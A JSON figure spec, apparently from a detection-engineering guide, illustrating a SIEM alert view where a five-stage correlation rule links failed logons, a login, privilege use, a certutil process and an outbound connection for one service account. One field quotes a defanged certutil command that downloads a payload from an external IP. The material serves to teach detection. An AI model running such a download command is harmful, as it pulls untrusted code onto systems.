@@ -1,0 +1,21 @@
+{
+  "title": "DET-30-01 alert detail — five-stage correlated chain matched for one entity",
+  "event_type": "SIEM correlation-rule alert view, DET-30-01 (failed logons → successful login → privileged token → suspicious process → external connection), all five stages joined for one account/session",
+  "fields": [
+    { "label": "user / dest", "value": "svc-helpdesk01 / WIN-DC02" },
+    { "label": "first_fail / fail_count", "value": "2026-09-15T02:14:07Z / 7" },
+    { "label": "logon_time / logon_id", "value": "2026-09-15T02:14:52Z / 0x9F3A21" },
+    { "label": "priv_time", "value": "2026-09-15T02:14:53Z" },
+    { "label": "proc_time / Image", "value": "2026-09-15T02:15:10Z / certutil.exe" },
+    { "label": "CommandLine", "value": "certutil.exe -urlcache -f hxxp://185.203.x.x/payload.dat" },
+    { "label": "ProcessGuid", "value": "{5b2e1a4c-3f9d-11ee-91b2-000c29a1f4e0}" },
+    { "label": "conn_time / DestinationIp", "value": "2026-09-15T02:15:12Z / 185.203.x.x" }
+  ],
+  "callouts": [
+    { "number": 1, "field_label": "logon_time / logon_id", "explanation": "The successful logon that follows the failed-logon burst within DET-30-01's window; logon_id is the entity key that stitches stages 2 through 4 together." },
+    { "number": 2, "field_label": "proc_time / Image", "explanation": "The suspicious process stage — a LOLBin invocation carried on Sysmon Event ID 1 specifically so ProcessGuid is available for the final join, per the §3.1 Blind Spot." },
+    { "number": 3, "field_label": "ProcessGuid", "explanation": "The entity key switches from logon_id to ProcessGuid exactly at the stage 4→5 boundary, since no single key spans the whole chain (Figure 30.2)." },
+    { "number": 4, "field_label": "conn_time / DestinationIp", "explanation": "The final stage — an outbound connection from the flagged process — completing the chain within the configured window and producing the alert." }
+  ],
+  "note": "Conceptual/illustrative rendering of what a correlation-rule alert detail view showing all five matched stages would contain; not a captured screenshot of any actual SIEM product interface."
+}
